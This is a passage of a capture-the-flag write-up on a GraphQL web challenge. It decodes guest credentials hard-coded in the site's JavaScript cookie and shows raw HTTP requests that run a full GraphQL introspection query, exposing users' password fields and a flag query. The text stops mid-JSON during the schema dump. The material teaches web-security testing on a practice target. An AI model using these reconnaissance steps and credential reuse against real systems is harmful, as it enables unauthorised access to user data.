```javascript
function auth(){ 
    var username = document.getElementById(""Username"").value;
    var password = document.getElementById(""Password"").value;
    var head = btoa(username + ':' + password);
    $(document).ready(
        function() {
            $.post(
                ""graphql"",
                {
                    ""query"":""mutation{login(username:\""""+username+""\"",password:\""""+password+""\"")}""
                }, 
                function(data, textStatus) {
                    if(data.data.login==""Success"") {
                        document.cookie=""auth=""+head;
                        window.location='/dashboard'
                    } else {
                        alert('Wrong creds')
                    };
                },
                ""json""
            );
        }
    );
}

function yeet() { 
    document.cookie=""auth=Z3Vlc3Q6a2FybWE5ODc0"";
    window.location=""/dashboard""
}
```

Analyzing the JavaScript, you can discover that a query to a GraphQL endpoint is performed with the standard authentication. Credentials are put into cookies.

Guest credentials, decoded from base64, are the following.

```
guest:karma9874
```

Connecting as guest, you can reach the dashboard listing all the data and discover [another JavaScript](main.js) which contacts the GraphQL backend to retrieve data.

```javascript
$(document).ready(
    function() {
        $.post(
            ""graphql"",
            {
                ""query"":""query Query {\nChalls{\nid\ntitle\ndescription\ncategory\nauthor\npoints\n}\n}""
            },
            function(data, textStatus) {
                $.each(
                    data.data.Challs,
                    function(i,val) {
                        var deta = ""<tr><td>""+val.id+""</td><td>""+val.title+""</td><td>""+val.description+""</td><td>""+val.category+""</td><td>""+val.author+""</td><td>""+val.points+""</td></tr>"";
                        $('table tbody').append(deta);
                    }
                );
            },
            ""json""
        );
    }
);
```

Queries discovered till now are the following:
* `mutation { login(username:""username"", password:""password"") }`;
* `query Query { Challs { id title description category author points } }`.

You can enumerate types.

```
POST /graphql HTTP/1.1
Host: darkcon-challs.darkarmy.xyz
Content-Length: 29
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://darkcon-challs.darkarmy.xyz
Referer: http://darkcon-challs.darkarmy.xyz/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __cfduid=debb56df9ac3af6ddd05cb65280ecf14c1613856793; auth=Z3Vlc3Q6a2FybWE5ODc0
Connection: close

query={__schema{types{name}}}

HTTP/1.1 200 OK
Date: Sun, 21 Feb 2021 08:56:08 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: Express
ETag: W/""173-RJDzzhjsgOwt9ru9s6bKYl2W1Bw""
CF-Cache-Status: DYNAMIC
cf-request-id: 086566b39700001fea3b3b2000000001
Report-To: {""group"":""cf-nel"",""endpoints"":[{""url"":""https:\/\/a.nel.cloudflare.com\/report?s=Zp7fFMkJkX%2BKVEnfpvHSYCZ5CNgMhtuVLkII%2BKJnu9dcZi5DLUvA3OOr9yOOHA196QBwUXpxBrZ7c62v56nxAonLTmhCiWqSvkQbmj8U9CQSfvNHu0R5v%2F6xXAs%3D""}],""max_age"":604800}
NEL: {""report_to"":""cf-nel"",""max_age"":604800}
Server: cloudflare
CF-RAY: 624f4098fa1c1fea-AMS
Content-Length: 371

{
  ""data"": {
    ""__schema"": {
      ""types"": [
        {
          ""name"": ""Query""
        },
        {
          ""name"": ""String""
        },
        {
          ""name"": ""Challs""
        },
        {
          ""name"": ""Int""
        },
        {
          ""name"": ""hints""
        },
        {
          ""name"": ""users""
        },
        {
          ""name"": ""flags""
        },
        {
          ""name"": ""Mutation""
        },
        {
          ""name"": ""Boolean""
        },
        {
          ""name"": ""__Schema""
        },
        {
          ""name"": ""__Type""
        },
        {
          ""name"": ""__TypeKind""
        },
        {
          ""name"": ""__Field""
        },
        {
          ""name"": ""__InputValue""
        },
        {
          ""name"": ""__EnumValue""
        },
        {
          ""name"": ""__Directive""
        },
        {
          ""name"": ""__DirectiveLocation""
        }
      ]
    }
  }
}
```

And you can dump the database schema.

```
POST /graphql HTTP/1.1
Host: darkcon-challs.darkarmy.xyz
Content-Length: 1179
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://darkcon-challs.darkarmy.xyz
Referer: http://darkcon-challs.darkarmy.xyz/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __cfduid=debb56df9ac3af6ddd05cb65280ecf14c1613856793; auth=Z3Vlc3Q6a2FybWE5ODc0
Connection: close

query=fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}

HTTP/1.1 200 OK
Date: Sun, 21 Feb 2021 08:57:16 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: Express
ETag: W/""54e3-ui1CAAGaLDKrFmxVXj24YJqMqRI""
CF-Cache-Status: DYNAMIC
cf-request-id: 086567bebd00004c98282d2000000001
Report-To: {""max_age"":604800,""endpoints"":[{""url"":""https:\/\/a.nel.cloudflare.com\/report?s=Ct3S9Kw28mi6NJ%2FzbpfwbKwu87xzFMbn1aeDPt0QmLeqmwVqCgfQpP%2FyB7vOYha%2By1FDce%2F5hpj324JtOBiPANAj%2BDdiR7jZVQUk27OayWrKMWV%2FhBjElmLdZxg%3D""}],""group"":""cf-nel""}
NEL: {""report_to"":""cf-nel"",""max_age"":604800}
Server: cloudflare
CF-RAY: 624f42446de14c98-AMS
Content-Length: 21731

{
  ""data"": {
    ""__schema"": {
      ""queryType"": {
        ""name"": ""Query""
      },
      ""mutationType"": {
        ""name"": ""Mutation""
      },
      ""types"": [
        {
          ""kind"": ""OBJECT"",
          ""name"": ""Query"",
          ""description"": null,
          ""fields"": [
            {
              ""name"": ""Challs"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""LIST"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""OBJECT"",
                  ""name"": ""Challs"",
                  ""ofType"": null
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""allUsers"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""LIST"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""OBJECT"",
                  ""name"": ""users"",
                  ""ofType"": null
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""hint"",
              ""description"": null,
              ""args"": [
                {
                  ""name"": ""chall_id"",
                  ""description"": null,
                  ""type"": {
                    ""kind"": ""NON_NULL"",
                    ""name"": null,
                    ""ofType"": {
                      ""kind"": ""SCALAR"",
                      ""name"": ""String"",
                      ""ofType"": null
                    }
                  },
                  ""defaultValue"": null
                }
              ],
              ""type"": {
                ""kind"": ""OBJECT"",
                ""name"": ""hints"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""flag"",
              ""description"": null,
              ""args"": [
                {
                  ""name"": ""chall_id"",
                  ""description"": null,
                  ""type"": {
                    ""kind"": ""NON_NULL"",
                    ""name"": null,
                    ""ofType"": {
                      ""kind"": ""SCALAR"",
                      ""name"": ""String"",
                      ""ofType"": null
                    }
                  },
                  ""defaultValue"": null
                }
              ],
              ""type"": {
                ""kind"": ""OBJECT"",
                ""name"": ""flags"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            }
          ],
          ""inputFields"": null,
          ""interfaces"": [],
          ""enumValues"": null,
          ""possibleTypes"": null
        },
        {
          ""kind"": ""SCALAR"",
          ""name"": ""String"",
          ""description"": ""The `String` scalar type represents textual data, represented as UTF-8 character sequences. The String type is most often used by GraphQL to represent free-form human-readable text."",
          ""fields"": null,
          ""inputFields"": null,
          ""interfaces"": null,
          ""enumValues"": null,
          ""possibleTypes"": null
        },
        {
          ""kind"": ""OBJECT"",
          ""name"": ""Challs"",
          ""description"": null,
          ""fields"": [
            {
              ""name"": ""id"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""title"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""description"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""category"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""author"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""points"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""Int"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""flag"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""OBJECT"",
                ""name"": ""flags"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            }
          ],
          ""inputFields"": null,
          ""interfaces"": [],
          ""enumValues"": null,
          ""possibleTypes"": null
        },
        {
          ""kind"": ""SCALAR"",
          ""name"": ""Int"",
          ""description"": ""The `Int` scalar type represents non-fractional signed whole numeric values. Int can represent values between -(2^31) and 2^31 - 1."",
          ""fields"": null,
          ""inputFields"": null,
          ""interfaces"": null,
          ""enumValues"": null,
          ""possibleTypes"": null
        },
        {
          ""kind"": ""OBJECT"",
          ""name"": ""hints"",
          ""description"": null,
          ""fields"": [
            {
              ""name"": ""chall_id"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""chall_title"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""take_hint"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            }
          ],
          ""inputFields"": null,
          ""interfaces"": [],
          ""enumValues"": null,
          ""possibleTypes"": null
        },
        {
          ""kind"": ""OBJECT"",
          ""name"": ""users"",
          ""description"": null,
          ""fields"": [
            {
              ""name"": ""id"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""username"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""password"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            }
          ],
          ""inputFields"": null,
          ""interfaces"": [],
          ""enumValues"": null,
          ""possibleTypes"": null
        },
        {
          ""kind"": ""OBJECT"",
          ""name"": ""flags"",
          ""description"": null,
          ""fields"": [
            {
              ""name"": ""chall_id"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""chall_title"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""chall_flag"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            }
          ],
          ""inputFields"": null,
          ""interfaces"": [],
          ""enumValues"": null,
          ""possibleTypes"": null
        },
        {
          ""kind"": ""OBJECT"",
          ""name"": ""Mutation"",
          ""description"": null,
          ""fields"": [
            {
              ""name"": ""login"",
              ""description"": null,
              ""args"": [
                {
                  ""name"": ""username"",
                  ""description"": null,
                  ""type"": {
                    ""kind"": ""NON_NULL"",
                    ""name"": null,
                    ""ofType"": {
                      ""kind"": ""SCALAR"",
                      ""name"": ""String"",
                      ""ofType"": null
                    }
                  },
                  ""defaultValue"": null
                },
                {
                  ""name"": ""password"",
                  ""description"": null,
                  ""type"": {
                    ""kind"": ""NON_NULL"",
                    ""name"": null,
                    ""ofType"": {
                      ""kind"": ""SCALAR"",
                      ""name"": ""String"",
                      ""ofType"": null
                    }
                  },
                  ""defaultValue"": null
                }
              ],
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""SCALAR"",
                  ""name"": ""String"",
                  ""ofType"": null
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            }
          ],
          ""inputFields"": null,
          ""interfaces"": [],
          ""enumValues"": null,
          ""possibleTypes"": null
        },
        {
          ""kind"": ""SCALAR"",
          ""name"": ""Boolean"",
          ""description"": ""The `Boolean` scalar type represents `true` or `false`."",
          ""fields"": null,
          ""inputFields"": null,
          ""interfaces"": null,
          ""enumValues"": null,
          ""possibleTypes"": null
        },
        {
          ""kind"": ""OBJECT"",
          ""name"": ""__Schema"",
          ""description"": ""A GraphQL Schema defines the capabilities of a GraphQL server. It exposes all available types and directives on the server, as well as the entry points for query, mutation, and subscription operations."",
          ""fields"": [
            {
              ""name"": ""description"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""types"",
              ""description"": ""A list of all types supported by this server."",
              ""args"": [],
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""LIST"",
                  ""name"": null,
                  ""ofType"": {
                    ""kind"": ""NON_NULL"",
                    ""name"": null,
                    ""ofType"": {
                      ""kind"": ""OBJECT"",
                      ""name"": ""__Type"",
                      ""ofType"": null
                    }
                  }
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""queryType"",
              ""description"": ""The type that query operations will be rooted at."",
              ""args"": [],
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""OBJECT"",
                  ""name"": ""__Type"",
                  ""ofType"": null
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""mutationType"",
              ""description"": ""If this server supports mutation, the type that mutation operations will be rooted at."",
              ""args"": [],
              ""type"": {
                ""kind"": ""OBJECT"",
                ""name"": ""__Type"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""subscriptionType"",
              ""description"": ""If this server support subscription, the type that subscription operations will be rooted at."",
              ""args"": [],
              ""type"": {
                ""kind"": ""OBJECT"",
                ""name"": ""__Type"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""directives"",
              ""description"": ""A list of all directives supported by this server."",
              ""args"": [],
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""LIST"",
                  ""name"": null,
                  ""ofType"": {
                    ""kind"": ""NON_NULL"",
                    ""name"": null,
                    ""ofType"": {
                      ""kind"": ""OBJECT"",
                      ""name"": ""__Directive"",
                      ""ofType"": null
                    }
                  }
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            }
          ],
          ""inputFields"": null,
          ""interfaces"": [],
          ""enumValues"": null,
          ""possibleTypes"": null
        },
        {
          ""kind"": ""OBJECT"",
          ""name"": ""__Type"",
          ""description"": ""The fundamental unit of any GraphQL Schema is the type. There are many kinds of types in GraphQL as represented by the `__TypeKind` enum.\n\nDepending on the kind of a type, certain fields describe information about that type. Scalar types provide no information beyond a name, description and optional `specifiedByUrl`, while Enum types provide their values. Object and Interface types provide the fields they describe. Abstract types, Union and Interface, provide the Object types possible at runtime. List and NonNull types compose other types."",
          ""fields"": [
            {
              ""name"": ""kind"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""ENUM"",
                  ""name"": ""__TypeKind"",
                  ""ofType"": null
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""name"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""description"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""specifiedByUrl"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""fields"",
              ""description"": null,
              ""args"": [
                {
                  ""name"": ""includeDeprecated"",
                  ""description"": null,
                  ""type"": {
                    ""kind"": ""SCALAR"",
                    ""name"": ""Boolean"",
                    ""ofType"": null
                  },
                  ""defaultValue"": ""false""
                }
              ],
              ""type"": {
                ""kind"": ""LIST"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""NON_NULL"",
                  ""name"": null,
                  ""ofType"": {
                    ""kind"": ""OBJECT"",
                    ""name"": ""__Field"",
                    ""ofType"": null
                  }
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""interfaces"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""LIST"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""NON_NULL"",
                  ""name"": null,
                  ""ofType"": {
                    ""kind"": ""OBJECT"",
                    ""name"": ""__Type"",
                    ""ofType"": null
                  }
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""possibleTypes"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""LIST"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""NON_NULL"",
                  ""name"": null,
                  ""ofType"": {
                    ""kind"": ""OBJECT"",
                    ""name"": ""__Type"",
                    ""ofType"": null
                  }
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""enumValues"",
              ""description"": null,
              ""args"": [
                {
                  ""name"": ""includeDeprecated"",
                  ""description"": null,
                  ""type"": {
                    ""kind"": ""SCALAR"",
                    ""name"": ""Boolean"",
                    ""ofType"": null
                  },
                  ""defaultValue"": ""false""
                }
              ],
              ""type"": {
                ""kind"": ""LIST"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""NON_NULL"",
                  ""name"": null,
                  ""ofType"": {
                    ""kind"": ""OBJECT"",
                    ""name"": ""__EnumValue"",
                    ""ofType"": null
                  }
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""inputFields"",
              ""description"": null,
              ""args"": [
                {
                  ""name"": ""includeDeprecated"",
                  ""description"": null,
                  ""type"": {
                    ""kind"": ""SCALAR"",
                    ""name"": ""Boolean"",
                    ""ofType"": null
                  },
                  ""defaultValue"": ""false""
                }
              ],
              ""type"": {
                ""kind"": ""LIST"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""NON_NULL"",
                  ""name"": null,
                  ""ofType"": {
                    ""kind"": ""OBJECT"",
                    ""name"": ""__InputValue"",
                    ""ofType"": null
                  }
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""ofType"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""OBJECT"",
                ""name"": ""__Type"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            }
          ],
          ""inputFields"": null,
          ""interfaces"": [],
          ""enumValues"": null,
          ""possibleTypes"": null
        },
        {
          ""kind"": ""ENUM"",
          ""name"": ""__TypeKind"",
          ""description"": ""An enum describing what kind of type a given `__Type` is."",
          ""fields"": null,
          ""inputFields"": null,
          ""interfaces"": null,
          ""enumValues"": [
            {
              ""name"": ""SCALAR"",
              ""description"": ""Indicates this type is a scalar."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""OBJECT"",
              ""description"": ""Indicates this type is an object. `fields` and `interfaces` are valid fields."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""INTERFACE"",
              ""description"": ""Indicates this type is an interface. `fields`, `interfaces`, and `possibleTypes` are valid fields."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""UNION"",
              ""description"": ""Indicates this type is a union. `possibleTypes` is a valid field."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""ENUM"",
              ""description"": ""Indicates this type is an enum. `enumValues` is a valid field."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""INPUT_OBJECT"",
              ""description"": ""Indicates this type is an input object. `inputFields` is a valid field."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""LIST"",
              ""description"": ""Indicates this type is a list. `ofType` is a valid field."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""NON_NULL"",
              ""description"": ""Indicates this type is a non-null. `ofType` is a valid field."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            }
          ],
          ""possibleTypes"": null
        },
        {
          ""kind"": ""OBJECT"",
          ""name"": ""__Field"",
          ""description"": ""Object and Interface types are described by a list of Fields, each of which has a name, potentially a list of arguments, and a return type."",
          ""fields"": [
            {
              ""name"": ""name"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""SCALAR"",
                  ""name"": ""String"",
                  ""ofType"": null
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""description"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""args"",
              ""description"": null,
              ""args"": [
                {
                  ""name"": ""includeDeprecated"",
                  ""description"": null,
                  ""type"": {
                    ""kind"": ""SCALAR"",
                    ""name"": ""Boolean"",
                    ""ofType"": null
                  },
                  ""defaultValue"": ""false""
                }
              ],
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""LIST"",
                  ""name"": null,
                  ""ofType"": {
                    ""kind"": ""NON_NULL"",
                    ""name"": null,
                    ""ofType"": {
                      ""kind"": ""OBJECT"",
                      ""name"": ""__InputValue"",
                      ""ofType"": null
                    }
                  }
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""type"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""OBJECT"",
                  ""name"": ""__Type"",
                  ""ofType"": null
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""isDeprecated"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""SCALAR"",
                  ""name"": ""Boolean"",
                  ""ofType"": null
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""deprecationReason"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            }
          ],
          ""inputFields"": null,
          ""interfaces"": [],
          ""enumValues"": null,
          ""possibleTypes"": null
        },
        {
          ""kind"": ""OBJECT"",
          ""name"": ""__InputValue"",
          ""description"": ""Arguments provided to Fields or Directives and the input fields of an InputObject are represented as Input Values which describe their type and optionally a default value."",
          ""fields"": [
            {
              ""name"": ""name"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""SCALAR"",
                  ""name"": ""String"",
                  ""ofType"": null
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""description"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""type"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""OBJECT"",
                  ""name"": ""__Type"",
                  ""ofType"": null
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""defaultValue"",
              ""description"": ""A GraphQL-formatted string representing the default value for this input value."",
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""isDeprecated"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""SCALAR"",
                  ""name"": ""Boolean"",
                  ""ofType"": null
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""deprecationReason"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            }
          ],
          ""inputFields"": null,
          ""interfaces"": [],
          ""enumValues"": null,
          ""possibleTypes"": null
        },
        {
          ""kind"": ""OBJECT"",
          ""name"": ""__EnumValue"",
          ""description"": ""One possible value for a given Enum. Enum values are unique values, not a placeholder for a string or numeric value. However an Enum value is returned in a JSON response as a string."",
          ""fields"": [
            {
              ""name"": ""name"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""SCALAR"",
                  ""name"": ""String"",
                  ""ofType"": null
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""description"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""isDeprecated"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""SCALAR"",
                  ""name"": ""Boolean"",
                  ""ofType"": null
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""deprecationReason"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            }
          ],
          ""inputFields"": null,
          ""interfaces"": [],
          ""enumValues"": null,
          ""possibleTypes"": null
        },
        {
          ""kind"": ""OBJECT"",
          ""name"": ""__Directive"",
